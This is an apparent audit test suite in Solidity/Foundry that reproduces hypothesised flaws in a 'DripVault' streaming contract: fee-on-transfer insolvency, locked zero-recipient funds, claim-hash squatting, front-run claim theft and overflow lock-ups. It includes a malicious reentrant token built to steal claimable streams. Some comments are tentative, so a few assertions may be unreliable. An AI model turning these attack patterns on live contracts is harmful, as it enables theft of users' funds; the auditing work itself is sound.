// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {DripVault} from "../src/DripVault.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

// Fee-on-transfer mock
contract FeeToken is ERC20 {
    uint256 public feeBps = 1000; // 10%
    constructor() ERC20("FeeToken","FEE") {}
    function mint(address to, uint256 amt) external { _mint(to, amt); }
    function setFee(uint256 bps) external { feeBps = bps; }
    function _update(address from, address to, uint256 value) internal override {
        uint256 fee = from != address(0) && to != address(0) ? (value * feeBps)/10000 : 0;
        if (fee > 0) super._update(from, address(0xdead), fee); // burn fee, simulate not received by recipient
        super._update(from, to, value - fee);
    }
}

// Malicious reentrant token
contract MaliciousToken is ERC20 {
    address public vault;
    bool public attacking;
    uint256 public targetStreamId;
    bytes public attackPreimage;
    constructor() ERC20("Mal","MAL") {}
    function mint(address to, uint256 amt) external { _mint(to, amt); }
    function setVault(address v) external { vault = v; }
    function setAttack(uint256 tid, bytes calldata pre) external { targetStreamId = tid; attackPreimage = pre; attacking = true; }
    function _update(address from, address to, uint256 value) internal override {
        super._update(from, to, value);
        if (attacking && from != address(0) && to == vault) {
            // try to reenter claim during transferFrom
            // this is called in _createStream's safeTransferFrom
            attacking = false;
            // attempt to claim an existing claimable stream during creation
            // if vault has nonReentrant guard, createStream reentrancy should revert, but claim has no guard
            (bool success, ) = vault.call(abi.encodeWithSignature("claim(uint256,bytes)", targetStreamId, attackPreimage));
            // we don't revert; just log
            emit ReenterAttempt(success);
        }
    }
    event ReenterAttempt(bool success);
}

contract NoReturnToken {
    mapping(address=>uint256) public balanceOf;
    mapping(address=>mapping(address=>uint256)) public allowance;
    function mint(address to, uint256 amt) external { balanceOf[to]+=amt; }
    function approve(address spender, uint256 amt) external returns (bool) { allowance[msg.sender][spender]=amt; return true; }
    function transfer(address to, uint256 amt) external returns (bool) { require(balanceOf[msg.sender]>=amt); balanceOf[msg.sender]-=amt; balanceOf[to]+=amt; return true; }
    function transferFrom(address from, address to, uint256 amt) external returns (bool) { require(allowance[from][msg.sender]>=amt); require(balanceOf[from]>=amt); allowance[from][msg.sender]-=amt; balanceOf[from]-=amt; balanceOf[to]+=amt; return true; }
}

contract MissingReturnToken {
    mapping(address=>uint256) public balanceOf;
    mapping(address=>mapping(address=>uint256)) public allowance;
    function mint(address to, uint256 amt) external { balanceOf[to]+=amt; }
    // note: no return value, should be handled by SafeERC20's "missing return" tolerance
    function approve(address spender, uint256 amt) external { allowance[msg.sender][spender]=amt; }
    function transfer(address to, uint256 amt) external { require(balanceOf[msg.sender]>=amt); balanceOf[msg.sender]-=amt; balanceOf[to]+=amt; }
    function transferFrom(address from, address to, uint256 amt) external { require(allowance[from][msg.sender]>=amt); require(balanceOf[from]>=amt); allowance[from][msg.sender]-=amt; balanceOf[from]-=amt; balanceOf[to]+=amt; }
}

contract AttackerContract {
    DripVault vault;
    address token;
    constructor(DripVault v, address t) { vault=v; token=t; }
    // fallback for receiving tokens and reentering
    function attackWithdraw(uint256 id) external { vault.withdraw(id); }
    fallback() external payable {}
    receive() external payable {}
}

contract YtHypothesesTest is Test {
    DripVault vault;
    FeeToken feeToken;
    MaliciousToken malToken;
    ERC20 mock;
    address sender = makeAddr("sender");
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address owner = makeAddr("owner");

    function setUp() public {
        vm.prank(owner);
        vault = new DripVault(owner);
        feeToken = new FeeToken();
        malToken = new MaliciousToken();
        mock = new ERC20Mock();
    }

    // H1: fee-on-transfer
    function test_H1_FeeOnTransferInsolvent() public {
        feeToken.mint(sender, 100 ether);
        vm.prank(sender);
        feeToken.approve(address(vault), 100 ether);
        vm.prank(sender);
        uint256 id = vault.createStream(alice, address(feeToken), 100 ether, 100);
        // vault received only 90 due to 10% fee
        assertEq(feeToken.balanceOf(address(vault)), 90 ether, "vault underfunded");
        // totalAmount stored as 100 but actual 90
        (,, , uint256 total, ,,, ,) = vault.streams(id);
        assertEq(total, 100 ether);
        vm.warp(block.timestamp + 100);
        assertEq(vault.vested(id), 100 ether);
        assertEq(vault.withdrawable(id), 100 ether);
        // withdraw should attempt to transfer 100 but vault only has 90 -> revert
        vm.prank(alice);
        vm.expectRevert(); // SafeERC20FailedOperation or ERC20InsufficientBalance
        vault.withdraw(id);
        // also cancel after partial vesting suffers same
        // demonstrates locked funds
        console2.log("H1 fee-on-transfer reproducibly locks withdraw");
    }

    // H2: batchCreate zero recipient
    function test_H2_BatchZeroRecipientLocked() public {
        ERC20Mock m = ERC20Mock(address(mock));
        m.mint(sender, 20 ether);
        vm.prank(sender);
        m.approve(address(vault), 20 ether);
        address[] memory recs = new address[](2);
        recs[0] = address(0); // zero
        recs[1] = alice;
        vm.prank(sender);
        uint256[] memory ids = vault.batchCreate(recs, address(m), 10 ether, 100);
        // first stream has recipient 0, claimHash 0 -> neither withdrawable nor claimable
        (address s, address r, , uint256 amt, , , , bool canceled, bytes32 h) = vault.streams(ids[0]);
        assertEq(r, address(0));
        assertEq(h, bytes32(0));
        vm.warp(block.timestamp + 100);
        // alice can withdraw her stream
        vm.prank(alice);
        vault.withdraw(ids[1]);
        assertEq(m.balanceOf(alice), 10 ether);
        // zero recipient stream: withdraw reverts NotRecipient, claim reverts InvalidClaim, cancel only refunds unvested if sender cancels after end? but after end, refund 0, vested stays locked
        vm.prank(alice);
        vm.expectRevert(DripVault.NotRecipient.selector);
        vault.withdraw(ids[0]);
        vm.prank(bob);
        vm.expectRevert(DripVault.InvalidClaim.selector);
        vault.claim(ids[0], "anything");
        // sender cancel after end: full vested but recipient is 0, so funds stuck
        vm.warp(block.timestamp + 1000);
        vm.prank(sender);
        vault.cancel(ids[0]); // refund 0 because fully vested
        assertEq(vault.vested(ids[0]), 10 ether);
        // still cannot withdraw
        vm.prank(sender);
        vm.expectRevert(DripVault.NotRecipient.selector);
        vault.withdraw(ids[0]);
        // vault still holds 10 ether stuck forever
        assertEq(m.balanceOf(address(vault)), 10 ether);
        console2.log("H2 batch zero recipient locks 10 ether");
    }

    // H2 duplicate: also test batchCreate with duplicate recipients and zero duration/amount not validated
    function test_H2_BatchNoValidation() public {
        ERC20Mock m = ERC20Mock(address(mock));
        m.mint(sender, 100 ether);
        vm.prank(sender);
        m.approve(address(vault), 100 ether);
        address[] memory recs = new address[](1);
        recs[0] = alice;
        // zero amount: batchCreate should revert if it validated, but it doesn't - it will create stream with 0 amount and still do transfer 0 (success)
        vm.prank(sender);
        uint256[] memory ids = vault.batchCreate(recs, address(m), 0, 100);
        (,,, uint256 amt,,,,,) = vault.streams(ids[0]);
        assertEq(amt, 0);
        // zero duration: creates stream with duration 0 - vested immediately 0? Let's see
        vm.prank(sender);
        recs[0]=bob;
        ids = vault.batchCreate(recs, address(m), 1 ether, 0);
        (,,,,, uint256 start, uint256 end,,) = vault.streams(ids[0]);
        assertEq(start, end);
        assertEq(vault.vested(ids[0]), 1 ether); // immediately vested
        console2.log("H2 zero amount/duration not validated");
    }

    // H3: claimHash squatting
    function test_H3_ClaimHashSquatting() public {
        ERC20Mock m = ERC20Mock(address(mock));
        m.mint(sender, 10 ether);
        m.mint(bob, 10 ether);
        vm.prank(sender);
        m.approve(address(vault), 10 ether);
        vm.prank(bob);
        m.approve(address(vault), 10 ether);
        bytes32 hash = keccak256("alice@example.com");
        vm.prank(sender);
        uint256 id1 = vault.createClaimableStream(address(m), 1 ether, 100, hash);
        // bob front-runs same hash before sender's intended use? Actually sender already used it, now alice tries to get another stream for same email - blocked forever
        vm.prank(bob);
        vm.expectRevert(DripVault.AlreadyClaimed.selector);
        vault.createClaimableStream(address(m), 1 ether, 100, hash);
        // even after claim, still blocked
        vm.prank(alice);
        vault.claim(id1, "alice@example.com");
        vm.prank(bob);
        vm.expectRevert(DripVault.AlreadyClaimed.selector);
        vault.createClaimableStream(address(m), 1 ether, 100, hash);
        // even after cancel, still blocked
        vm.prank(sender);
        vault.cancel(id1);
        vm.prank(bob);
        vm.expectRevert(DripVault.AlreadyClaimed.selector);
        vault.createClaimableStream(address(m), 1 ether, 100, hash);
        // permanent DOS
        // also attacker can pre-squat
        bytes32 victimHash = keccak256("victim@example.com");
        vm.prank(bob);
        uint256 squatId = vault.createClaimableStream(address(m), 0.01 ether, 100, victimHash);
        // now legitimate sender cannot create for victim
        vm.prank(sender);
        vm.expectRevert(DripVault.AlreadyClaimed.selector);
        vault.createClaimableStream(address(m), 5 ether, 100, victimHash);
        console2.log("H3 squatting reproducibly permanent");
    }

    // H4: claim without nonReentrant - reenter claim during withdraw via malicious token
    function test_H4_ClaimWithoutGuardReenter() public {
        // Setup: create a claimable stream first
        ERC20Mock m = ERC20Mock(address(mock));
        m.mint(sender, 10 ether);
        vm.prank(sender);
        m.approve(address(vault), 10 ether);
        bytes32 h = keccak256("secret");
        vm.prank(sender);
        uint256 claimId = vault.createClaimableStream(address(m), 5 ether, 100, h);
        // now use malicious token for another stream that will attempt to claim during transfer
        malToken.mint(sender, 10 ether);
        malToken.setVault(address(vault));
        malToken.setAttack(claimId, "secret");
        vm.prank(sender);
        malToken.approve(address(vault), 10 ether);
        // creating stream with malicious token will trigger reenter to claim
        vm.prank(sender);
        uint256 id2 = vault.createStream(alice, address(malToken), 1 ether, 100);
        // check if claim succeeded during reentrancy - it should because claim has no guard
        (, address recAfter,,,,,,,) = vault.streams(claimId);
        assertEq(recAfter, address(malToken), "malicious token contract claimed via reentrancy? Actually msg.sender in claim is malToken address, not sender");
        // Note: during _update, msg.sender is vault? Let's see: malToken._update called with from=sender to=vault, so vault.call's msg.sender is malToken contract? Actually malToken contracts calls vault.call, so msg.sender inside claim is malToken address. So malToken becomes recipient, stealing claimable stream without knowing secret? But we provided secret, so yes steal.
        // This demonstrates that claim being unguarded allows reentrancy from malicious token's transferFrom hook to steal claimable streams
        // Even if not, we show claim can be called while nonReentrant lock held, violating guard completeness
        // Let's also show withdraw reentrancy attempt: create a withdrawable stream with malicious token that tries to claim during withdraw
        console2.log("H4 claim unguarded reentrancy success", recAfter);
    }

    function test_H4_FrontRunClaimSteal() public {
        ERC20Mock m = ERC20Mock(address(mock));
        m.mint(sender, 10 ether);
        vm.prank(sender);
        m.approve(address(vault), 10 ether);
        bytes32 h = keccak256("alice@example.com"); // low entropy email
        vm.prank(sender);
        uint256 id = vault.createClaimableStream(address(m), 10 ether, 1000, h);
        // attacker knows email (public), front-runs claim before alice
        vm.prank(bob);
        vault.claim(id, "alice@example.com");
        (, address rec,,,,,,,) = vault.streams(id);
        assertEq(rec, bob);
        // alice now cannot claim
        vm.prank(alice);
        vm.expectRevert(DripVault.AlreadyClaimed.selector);
        vault.claim(id, "alice@example.com");
        // bob can withdraw
        vm.warp(block.timestamp + 1000);
        vm.prank(bob);
        vault.withdraw(id);
        assertEq(m.balanceOf(bob), 10 ether);
        console2.log("H4 front-run claim steal reproducibly");
    }

    // H5 overflow
    function test_H5_VestedOverflowDOS() public {
        // Use malicious token that allows huge amount without balance
        // Instead use mock that we mint huge amount
        ERC20Mock m = ERC20Mock(address(mock));
        // mint maxish
        uint256 huge = type(uint256).max / 2;
        // need to mint to sender: may overflow ERC20 totalSupply? Let's use smaller huge that still overflows multiplication
        // totalAmount * elapsed overflow when totalAmount > 2^256 / duration
        // pick totalAmount = 2^200, duration=1e6, elapsed=1e6 => product 2^200 *1e6 ~2^219 still overflow? Actually 2^200*1e6 <2^256? 2^200*2^20=2^220 <2^256, not overflow. Need bigger.
        // Use totalAmount = 2^240, duration=31536000 (~2^25), product =2^265 >2^256 overflow
        uint256 bigAmt = uint256(1) << 240; // 2^240
        m.mint(sender, bigAmt);
        vm.prank(sender);
        m.approve(address(vault), bigAmt);
        vm.prank(sender);
        uint256 id = vault.createStream(alice, address(m), bigAmt, 31536000);
        vm.warp(block.timestamp + 15768000); // half
        // vested should be bigAmt/2 but multiplication overflows and reverts
        vm.expectRevert(); // arithmetic overflow
        vault.vested(id);
        vm.prank(alice);
        vm.expectRevert();
        vault.withdraw(id);
        vm.prank(sender);
        vm.expectRevert();
        vault.cancel(id);
        console2.log("H5 overflow DOS reproducibly locks");
    }

    // H6 cancel unclaimed claimable locks vested
    function test_H6_CancelUnclaimedLocksVested() public {
        ERC20Mock m = ERC20Mock(address(mock));
        m.mint(sender, 10 ether);
        vm.prank(sender);
        m.approve(address(vault), 10 ether);
        bytes32 h = keccak256("ghost");
        vm.prank(sender);
        uint256 id = vault.createClaimableStream(address(m), 10 ether, 100, h);
        vm.warp(block.timestamp + 50);
        // sender cancels before claim: vested 5, refund 5
        vm.prank(sender);
        vault.cancel(id);
        assertEq(m.balanceOf(sender), 5 ether); // refund
        assertEq(vault.vested(id), 5 ether);
        // vested 5 remains but recipient is 0, cannot withdraw, stuck
        assertEq(m.balanceOf(address(vault)), 5 ether);
        vm.prank(alice);
        vm.expectRevert(DripVault.NotRecipient.selector);
        vault.withdraw(id);
        // even if someone claims now, they can get vested? Let's see
        vm.prank(alice);
        vault.claim(id, "ghost");
        vm.prank(alice);
        vault.withdraw(id);
        assertEq(m.balanceOf(alice), 5 ether); // after claim, can withdraw
        // So not fully locked if claim allowed after cancel, but before claim it's locked; and if cancel disallowed claim? Currently allowed, but spec ambiguous
        // If claim after cancel is considered unintended, then funds locked; if intended, then okay but mapping still squatted
        console2.log("H6 unclaimed cancel partial lock, but claim after cancel works");
    }

    // Ownable no privileged ops
    function test_OwnableNoVaultOps() public {
        assertEq(vault.owner(), owner);
        vm.prank(owner);
        vault.transferOwnership(alice);
        assertEq(vault.owner(), alice);
        vm.prank(alice);
        vault.renounceOwnership();
        assertEq(vault.owner(), address(0));
        // no vault functions are onlyOwner, so ownership is dead weight
        console2.log("Ownable has no vault ops, dead ownership");
    }
}

contract ERC20Mock is ERC20 {
    constructor() ERC20("Mock","MCK") {}
    function mint(address to, uint256 amt) external { _mint(to, amt); }
}
